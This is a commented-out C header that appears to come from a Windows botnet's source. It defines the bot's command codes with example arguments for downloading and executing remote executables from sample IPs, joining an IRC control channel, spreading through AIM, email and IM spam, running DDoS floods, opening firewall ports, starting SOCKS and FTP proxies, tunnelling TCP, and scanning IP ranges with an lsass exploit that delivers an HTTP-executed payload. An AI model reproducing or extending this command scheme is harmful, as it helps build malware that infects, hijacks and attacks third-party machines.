//obsolete
/*#include <windows.h>
#include "p2p2.h"
#include "transferlog.h"
#include "http.h"
#include "irc.h"
#include "spread.h"
#include "proxy.h"
#include "ddos.h"
#include "ftp.h"
#include "aim.h"
#include "msm.h"
#include "yahoo.h"
#include "triton.h"
#include "scan.h"
#include "tcptunnel.h"

#define MAX_MSG_LENGTH RECVBUF_SIZE

#define MSG_SENDLOG 1 // 3,127.0.0.1,54723
#define MSG_HTTP_DOWNLOAD 2 // site.com/file.exe,C:\local.exe   http://1.32.4.53/file.exe,temp,1 execute  http://12.12.12.12/new.exe,temp,2 update
#define MSG_START_IRCBOT 3 // irc.efnet.org,6667,#channel,nick,ident,name
#define MSG_SPREAD_AIM 4 // 10 sends max 10 direct connect ims
#define MSG_DDOS 5 // <1 to cancel other ddos, 0 to keep them>,<host>,<port>,<flags>,<amount>,<delay>,<time>  1 stops all
#define MSG_SPREAD_EMAIL 6 // 200 sends max 200 emails
#define MSG_START_FTP 7 // 21,user,pass,autostart
#define MSG_START_SOCKS 8 // 45,1080,user:pass,autostart 4,1080 4,1080,autostart
#define MSG_FIREWALL_OPEN_PORT 9 // 23  53,udp
#define MSG_SEND_IM 10 // 1,poopface301,hi,1  <program 1=aim 2=msn 4=yahoo>,sn,message,close
#define MSG_SPAM_IM 11 // <program>,message,minimum idle time in milliseconds
#define MSG_HTTP_VISIT 12 // http://site.com
#define MSG_HTTP_SPEEDTEST 13 // http://www.microsoft.com
#define MSG_SCAN 14
// exploit,lsass  scan:exploit,none
// payload,HTTPEXEC,http://site.com/file.exe
// target,add,70.104.*.30-60   scan:target:clear
// start,5000 millisecond interval  scan:stop
#define MSG_TCPTUNNEL 15 // <localport>,<remoteport>,<remotehost>

VOID ExecuteMessage(PCHAR Message);*/